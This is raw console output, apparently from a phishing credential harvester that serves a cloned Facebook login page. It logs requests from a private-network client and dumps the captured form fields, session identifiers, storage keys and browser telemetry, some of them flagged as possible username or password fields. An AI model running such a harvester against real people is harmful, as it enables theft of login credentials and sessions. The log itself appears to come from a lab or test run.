[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":":8f8sw2:enzsu9","t":1736281937935.5999,"b":[1,128]},1736282310173.9001,0,584]],"user":"0","webSessionId":":8f8sw2:enzsu9","send_method":"beacon","compression":""}]                
------WebKitFormBoundarytUDWqywab6aONVAi--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:38:54] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=a&__rev=1019191350&__s=gf6aiw%3A8f8sw2%3Aenzsu9&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
192.168.10.106 - - [07/Jan/2025 17:38:59] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryDlFAC7dtANHCNhL5      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282343763                                                                
------WebKitFormBoundaryDlFAC7dtANHCNhL5                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"user":"0","webSessionId":"yi5e7u:s42za2:2fvu3x","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"a79cb506-bb16-468d-b7d6-dab7fd1a6724\",\"ct\":1659080345,\"sjd\":\"TQI84g4VcVmIBbdP6AWSWDS9jQs2q+YsgJONWdYFJuZvROLv0bnHLHOtZlDHRR4RKopxwTPstNIW9xwep9YYrCBu3ZQ0yc6A9m2xlSNKIEkJiPG8FdSi/jXfXG5JqxEWI/waYUdwOEtGkPQ0SbkZGA==\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"yi5e7u:s42za2:2fvu3x","t":1736281863041.9,"b":[1,128]},1736282343762.9,0,512]],"trigger":"falco:bd_pdc_signals"}]              
------WebKitFormBoundaryDlFAC7dtANHCNhL5--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:02] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=1&__rev=1019191350&__s=yi5e7u%3As42za2%3A2fvu3x&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarySNzuAkX6iIda23sY      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282345528                                                                
------WebKitFormBoundarySNzuAkX6iIda23sY                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"a79cb506-bb16-468d-b7d6-dab7fd1a6724\",\"ct\":1659080345,\"sjd\":\"TQI84g4VcVmIBbdP6AWSWDS9jQs2q+YsgJONWdYFJuZvROLv0bnHLHOtZlDHRR4RKopxwTPstNIW9xwep9YYrCBu3ZQ0yc6A9m2xlSNKIEkJiPG8FdSi/jXfXG5JqxEWI/waYUdwOEtGkPQ0SbkZGA==\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"yi5e7u:s42za2:2fvu3x","t":1736281863041.9,"b":[1,128]},1736282343762.9,1,512],["falco:web_blue_time_spent_navigation",{"e":"{\"json_data\":\"{\\\"source_path\\\":null,\\\"source_token\\\":null,\\\"dest_path\\\":\\\"XWebLoginController\\\",\\\"dest_token\\\":\\\"96e88af3\\\",\\\"impression_id\\\":\\\"1zB83NHoOGgDJ39Z4\\\",\\\"cause\\\":\\\"load\\\",\\\"sid_raw\\\":\\\"yi5e7u:s42za2:2fvu3x\\\",\\\"referrer\\\":\\\"\\\",\\\"dest_ef_page\\\":null,\\\"dest_uri\\\":\\\"https://www.facebook.com/login.php\\\"}\"}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"yi5e7u:s42za2:2fvu3x","t":1736281863070.2998,"b":[1,128]},1736282343772.8,0,656],["falco:web_perf_device_info_log",{"e":"{\"cpu_cores\":2,\"ram\":null,\"gpu_renderer\":\"ANGLE (Intel, Intel(R) UHD Graphics (0x00009A78) Direct3D11 vs_5_0 ps_5_0, D3D11)\",\"gpu_vendor\":\"Google Inc. (Intel)\"}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"yi5e7u:s42za2:2fvu3x","t":1736281863118.2998,"b":[1,128]},1736282343820.8,0,442],["falco:bd_pdc_signals",{"e":"{\"asid\":\"a79cb506-bb16-468d-b7d6-dab7fd1a6724\",\"ct\":1659080345,\"sjd\":\"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\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"yi5e7u:s42za2:2fvu3x","t":1736281863123.0999,"b":[1,128]},1736282343825.3,0,2455]],"user":"0","webSessionId":"yi5e7u:s42za2:2fvu3x","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":""}]         
------WebKitFormBoundarySNzuAkX6iIda23sY--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:04] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=2&__rev=1019191350&__s=yi5e7u%3As42za2%3A2fvu3x&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryVB3w0aOWN3t5fUtc      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282352803                                                                
------WebKitFormBoundaryVB3w0aOWN3t5fUtc                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"mBLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJhNzljYjUwNi1iYjE2LTQ2OGQtYjdkNi1kYWI3ZmQxYTY3MjRcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CcVFFJODRnNFZjVm1JQmJkUDZBV1NXRFM5alFzMnErWXNnSk9OV2RZRkp1WnZST0x2MGJuSExIT3RabERIUlI0UktvcHh3VFBzdE5JVzl4d2VwOVlZckNCdTNaUTB5YzZBOW0yeGxTTktJRWtKaVBHOEZkU2kvalhmWEc1SnF4RVdJL3dhWVVkd09FdEdrUFEwU2JrWkdBPT1cIixcIgno9CABLTF9IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoieWk1ZTd1OnM0MnphMjoyZnZ1M3giLCJ0IjoxNzM2MjgxODYzMDQxLjksImIiOlsxLDEyOF19LDE3MzYyODIzNDM3NjIuOSwyLDUxMl0sW00wMG9kc193ZWJfYmF0Y2hdLwUQJFwiOntcIjI5NjYJCkxtcy50aW1lX3NwZW50LnFhLnd3dwkaHRdEYml0cy5qc19pbml0aWFsaXplQXgQe1wiblwhjgRcIgEPNG51bGx9fX0sXCI3MTczCUQwZW50aXRpZXMuZmZfagWWAC42zgJALjI1NjI4MTA0MDU1OC4wLkMROQB2AY8MbG9nZy5rAAAyLmsACCxcIgkmYGluZm8udXBsb2FkX21ldGhvZC5iYW56YWkBQCBfY3JpdGljYWwJkUKxADZGAEo4ABFaJHByb2Nlc3Npbmd+SgAJi5q4ABlyDTiGaQAFtEZZASXzDGx1ZV85uShfbmF2aWdhdGlvbrZpAQAxymkBMGltbWVkaWF0ZWx5XCJSHQJibAEdO6IGARVNRm8BMr4ABSlWLgEscGVyZl9kZXZpY2VfQUUMX2xvZ/4oATUoytkBotMABH19/goF/goF/goFygoFKDgwNDcuMDk5OSwiUg0FODg3NDkuNCwwLDEyNDZdLPE+YRd9EiBiaXRfYXJyYXm9GRRzaWRfcmGB9wBcUpMF5TsQc3RhcnQFSoH0pZ8kMjM0MyxcInRvcwlTJFwiOlszNzMsMF0NFhhjdW1cIjo2DQ4IaWRc4WoAMqXnBFwiDRYEbGWBlAA5DQ4Yc2VxXCI6MP7fAf7fAf7fAcbfARA3MTA4OFbaATg1MTc5MC4zLDAsNDE1XV0=","user":"0","webSessionId":"yi5e7u:s42za2:2fvu3x","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]           
------WebKitFormBoundaryVB3w0aOWN3t5fUtc--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:12] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=3&__rev=1019191350&__s=yi5e7u%3As42za2%3A2fvu3x&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
^A^T[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryeuABCuRpfIaFTMq4      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282373757                                                                
------WebKitFormBoundaryeuABCuRpfIaFTMq4                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"user":"0","webSessionId":"yi5e7u:s42za2:2fvu3x","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"a79cb506-bb16-468d-b7d6-dab7fd1a6724\",\"ct\":1659080345,\"sjd\":\"TQI84g4VcVmIBbdP6AWSWDi6R5NLRhvcbkAwWDKW1Bifd/MDZHB1sjeOmi432PBoXiGb4UDb4X3iFf0xorf7KwPzGdLcp4/ypUWgsKG6YhNcQXuTpQSHkayGjQjuX8ZD+R0HqrOXGeOhCHpT5ju93A==\",\"sid\":-1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"yi5e7u:s42za2:2fvu3x","t":1736281893054.5999,"b":[1,128]},1736282373757,0,515]],"trigger":"falco:bd_pdc_signals"}]             
------WebKitFormBoundaryeuABCuRpfIaFTMq4--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:33] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=4&__rev=1019191350&__s=yi5e7u%3As42za2%3A2fvu3x&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[savefrom-helper-extension]=9                          
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=5                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=yi5e7u:s42za2:2fvu3x                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:33] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[savefrom-helper-extension]=9                          
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=6                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=yi5e7u:s42za2:2fvu3x                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:33] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[savefrom-helper-extension]=9                          
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=7                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=yi5e7u:s42za2:2fvu3x                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:39:33] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryt0cNLsohAK8jdKAO      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282417352                                                                
------WebKitFormBoundaryt0cNLsohAK8jdKAO                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"xBLwaVtbImZhbGNvOmJkX3BkY19zaWduYWxzIix7ImUiOiJ7XCJhc2lkXCI6XCJhNzljYjUwNi1iYjE2LTQ2OGQtYjdkNi1kYWI3ZmQxYTY3MjRcIixcImN0XCI6MTY1OTA4MDM0NSxcInNqZFwBQ/CcVFFJODRnNFZjVm1JQmJkUDZBV1NXRFM5alFzMnErWXNnSk9OV2RZRkp1WnZST0x2MGJuSExIT3RabERIUlI0UktvcHh3VFBzdE5JVzl4d2VwOVlZckNCdTNaUTB5YzZBOW0yeGxTTktJRWtKaVBHOEZkU2kvalhmWEc1SnF4RVdJL3dhWVVkd09FdEdrUFEwU2JrWkdBPT1cIixcIgno9CABLTF9IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoieWk1ZTd1OnM0MnphMjoyZnZ1M3giLCJ0IjoxNzM2MjgxODYzMDQxLjksImIiOlsxLDEyOF19LDE3MzYyODIzNDM3NjIuOSwzLDUxMl0sW00wMG9kc193ZWJfYmF0Y2hdLwUQJFwiOntcIjcxNzMJCjBlbnRpdGllcy5mZl9qBTgALgE8kHRpbWVfc3BlbnRfYml0X2FycmF5LjI1NjI4MTA0MDU1OC4wLkMRQyx2ZW50LmxvZ2dlZFwFXwRuXCGlBFwiAQ8cbnVsbH0sXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAsX2ltbWVkaWF0ZWx5kkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4AAQH+egL+egL+egLCegIgNzYwODkuNywiTnoCODU2NzkxLjksMCw1ODddLP6qBO6qBI2q8IFpNlI1TkxSaHZjYmtBd1dES1cxQmlmZC9NRFpIQjFzamVPbWk0MzJQQm9YaUdiNFVEYjRYM2lGZjB4b3JmN0t3UHpHZExjcDQveXBVV2dzS0c2WWhOY1FYdVRwUVNIa2F5R2pRanVYOFpEK1IwSHFyT1hHZU9oQ0hwVDVqdTkzQT09pWH+qgT+qgT+qgTmqgQkOTMwNTQuNTk5OVYzAiw3Mzc1NywxLDUxNV1VMf6rBDYbB/6hBIahBBxjcml0aWNhbH5RBIXnnZ4ROI1q/psE/psE/psE/psE+psEEDk4MDU1XpsEMDc4NzU4LDAsNTcxXV0=","user":"0","webSessionId":"yi5e7u:s42za2:2fvu3x","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1},{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"yi5e7u:s42za2:2fvu3x\",\"start_time\":1736282352,\"tos_array\":[187,0],\"tos_cum\":12,\"tos_id\":\"2fvu3x\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":":s42za2:2fvu3x","t":1736281935632.7,"b":[1,128]},1736282416335.1,0,413]],"user":"0","webSessionId":":s42za2:2fvu3x","compression":""}]                                                           
------WebKitFormBoundaryt0cNLsohAK8jdKAO--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:40:16] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=8&__rev=1019191350&__s=%3As42za2%3A2fvu3x&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
